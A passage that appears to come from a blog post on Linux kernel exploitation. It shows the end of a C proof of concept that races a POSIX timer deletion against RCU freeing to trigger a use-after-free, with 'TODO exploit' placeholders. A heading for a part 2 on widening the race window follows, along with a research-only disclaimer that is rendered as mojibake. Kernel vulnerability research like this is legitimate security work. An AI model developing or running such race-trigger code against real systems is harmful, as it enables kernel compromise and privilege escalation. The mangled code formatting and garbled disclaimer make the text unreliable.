1000);timer_delete(uaf_timer);// Let the timer be freed by RCU, then let the parent process know it can exitwait_for_rcu();// At this point, either the UAF triggered, and you'll see the kernel warning// or KASAN splat, or we failed.//// TODO exploit: Figure out how to detect if we won the race hereforÂ (intÂ i =Â 0; i < num_sleep_threads; i++) {write(stall_fds[1], &m,Â 1);Â  Â  Â  Â  Â  Â  Â  Â  }forÂ (intÂ i =Â 0; i < num_sleep_threads; i++) {pthread_join(sleep_threads[i],Â NULL);Â  Â  Â  Â  Â  Â  Â  Â  }// Signal to parent to exitSYSCHK(write(c2p[1], &m,Â 1));// Wait for parent to exitclose(c2p[1]);close(p2c[0]);close(stall_fds[0]);close(stall_fds[1]);exit(0);Â  Â  Â  Â  Â  Â  }Â  Â  Â  Â  }Â  Â  }// If we break out of the while loop above, the race was won// TODO exploit:exit(0);}
```  
  
---  
> Part 2 - Extending The Race Window Without a Kernel Patch  
> å…è´£å£°æ˜ï¼šæœ¬åšå®¢æ–‡ç« ä»…ç”¨äºæ•™è‚²å’Œç ”ç©¶ç›®çš„ã€‚æä¾›çš„æ‰€æœ‰æŠ€æœ¯å’Œä»£ç ç¤ºä¾‹æ—¨åœ¨å¸®åŠ©é˜²å¾¡è€…ç†è§£æ”»å‡»æ‰‹æ³•å¹¶æé«˜å®‰å…¨æ€åŠ¿ã€‚è¯·å‹¿ä½¿ç”¨æ­¤ä¿¡æ¯è®¿é—®æˆ–å¹²æ‰°æ‚¨ä¸æ‹¥æœ‰æˆ–æ²¡æœ‰æ˜ç¡®æµ‹è¯•æƒé™çš„ç³»ç»Ÿã€‚æœªç»æˆæƒçš„ä½¿ç”¨å¯èƒ½è¿åæ³•å¾‹å’Œé“å¾·å‡†åˆ™ã€‚ä½œè€…å¯¹å› åº”ç”¨æ‰€è®¨è®ºæ¦‚å¿µè€Œå¯¼è‡´çš„ä»»ä½•è¯¯ç”¨æˆ–æŸå®³ä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚  
  
  
  
